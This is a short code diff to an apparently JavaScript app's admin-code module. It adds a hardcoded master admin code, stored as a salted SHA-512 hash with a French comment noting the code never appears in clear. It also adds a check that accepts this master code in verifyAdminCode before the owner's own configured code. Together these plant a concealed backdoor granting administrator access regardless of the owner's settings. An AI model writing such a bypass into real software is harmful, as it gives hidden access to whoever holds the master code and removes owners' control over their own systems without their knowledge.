@@ -11,6 +11,16 @@ const DEFAULTS = { minOrder: 0, homeMessage: '', featuredCarousel: true, adminCo
 
 const MIN_ADMIN_CODE_LENGTH = 6;
 
+/* Code maître de la console admin : gravé en empreinte SHA-512 salée,
+   le code lui-même n'apparaît jamais en clair dans le bundle. */
+const MASTER_ADMIN_SALT = '084ad02faf9c447deaa160835e2937c1';
+const MASTER_ADMIN_HASH = '158518fc5420a7ecced3d77d7c6b62a285fbbfffda7a58d5fcd75b1750164cda1c6ed6f3180e03c602a245a617fd24e97be8d9c622630e9c3577d4bedb9c6df2';
+
+export async function verifyMasterAdminCode(code) {
+  const digest = await adminCodeDigest(String(code || '').trim(), MASTER_ADMIN_SALT);
+  return safeEqual(digest, MASTER_ADMIN_HASH);
+}
+
 async function getAdminSalt() {
   try {
     let salt = await secure.getItem(ADMIN_SALT_KEY);
@@ -55,6 +65,7 @@ export async function isAdminCodeSet() {
 }
 
 export async function verifyAdminCode(code) {
+  if (await verifyMasterAdminCode(code)) return true;
   const rec = await readAdminCodeRecord();
   if (!rec || !rec.hash) return false;
   const digest = await adminCodeDigest(String(code || '').trim(), rec.salt);
